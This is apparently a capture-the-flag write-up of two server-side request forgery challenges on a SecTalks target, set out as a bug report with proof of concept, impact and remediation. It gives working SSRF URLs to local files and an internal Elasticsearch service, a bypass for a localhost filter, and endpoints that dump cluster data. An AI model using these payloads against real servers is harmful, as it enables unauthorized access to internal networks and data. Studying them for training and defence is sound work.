# Server Side Request Forgery: Local Files
Target: https://ssrfsquared.ns.agency/

### Proof of Concept

1. Intercept the requests made between the front and back end of the site during the initial load
2. Notice that there is a request for `https://ssrfsquared.ns.agency/static?r=http%3A%2F%2F127.0.0.1%3A9447%2Fstyles.css`, which can also be confirmed by viewing the source of the page
3. This becomes an entry point for an attacker to probe the internal network
4. Some files return the same content when accessed externally or internally such as `index.html` or `styles.css`
5. When viewing `https://ssrfsquared.ns.agency/static?r=http://127.0.0.1:9447/styles.css` there is a hint that something else is on the server
6. Logically we try `https://ssrfsquared.ns.agency/static?r=http://127.0.0.1:9447/flag` and it gives us the flag  
   `(wget -qO- https://ssrfsquared.ns.agency/static?r=http://127.0.0.1:9447/flag)` 
```

 ```
Extra Info:  
- not sure why but `localhost` gives the message `big sorry, we broke localhost, try 127.0.0.1` but this can be circumvented by using the following: `127.0.0.1`, `0`, `Localhost` / `lOcAlHoSt` etc 


### Impact 
**P2 - High**

Attackers can access localhost and read files stored in the working directory of the application, which may contain data that is not meant for public viewing. In this case only static files are retrieved, but in a real world scenario an attacker may be able to find other files (eg. _.php_ files) which may lead to code execution. If combined with a directory traversal vulnerability, the attacker can also read any files in the entire filesystem with the right permissions.

### Remediation 

Avoid querying files directly through URL requests using localhost, or perform server-side validation on the URLs requested if it cannot be avoided. Any important files in the working directory should have their permissions set so that they are not viewable by the web application if not necessary _(Principal of Least Privilege)_.  
  
   
# Server Side Request Forgery: Local Services
Target: https://ssrfsquared.ns.agency/

### Proof of Concept

The search functionality of the site is powered by _Elastic Search_, which serves up different Phrack articles.
There is also a flag stored in the service somewhere, as searching for `FLAG` or `flag` would reveal
```
The flag is sectalks{REDACTED}
```
hinting that it should be accessed locally. 

1. By doing port enumeration via GET requests or simply by guessing common port numbers, we can find the service at  
   `https://ssrfsquared.ns.agency/static?r=http://127.0.0.1:9200/`  
2. Utilizing the `_search` function we can search for the flag:  
   `https://ssrfsquared.ns.agency/static?r=http://0:9200/_search?q=sectalks`  returns :  
```
   {
  "took": 1,
  "timed_out": false,
  "_shards": {
    "total": 5,
    "successful": 5,
    "failed": 0
  },
  "hits": {
    "total": 1,
    "max_score": 8.236906,
    "hits": [
      {
        "_index": "phrack",
        "_type": "article",
        "_id": "976",
        "_score": 8.236906,
        "_source": {
          "content": "The flag is sectalks{ssrf_for_fun_and_profit}",
          "title": "Flag",
          "author": "sy + grc",
          "issue": 0,
          "number": 0
        }
      }
    ]
  }
}
```  

3. The flag can also be found by enumerating all phrack articles (Although not recommended)     
    `https://ssrfsquared.ns.agency/static?r=http://0:9200/phrack/article/976`  
   
Extra Info:  
- A lot of additional information can be found by executing any of the following commands 
```
http://0:9200/_cluster/settings
http://0:9200/_cluster/state
http://0:9200/phrack/article/14
http://0:9200/_tasks/
http://0:9200/_nodes?pretty=true
http://0:9200/_mapping
http://0:9200/_cat&?pretty=true
```

### Impact 
**P2 - High**

Attackers can enumerate port numbers and access services that are not public-facing, which might lead to the disclosure of data or unauthorized access to the internal network. This can allow for lateral movement or even worse privilege escalation, depending on the access controls within the internal network.

### Remediation

Similar to above, avoid sending requests to the internal network and to perform validation for requests if necessary. It is possible to implement a Web Application Firewall (WAF) but determined attackers may be able to bypass the WAF with specially crafted URLs (eg. by double encoding or using multibyte characters)

Elastic Search by itself does not support authentication so another method of solving this problem is to never assume the internal network is safe, and to install proper access controls on any/all internal services.
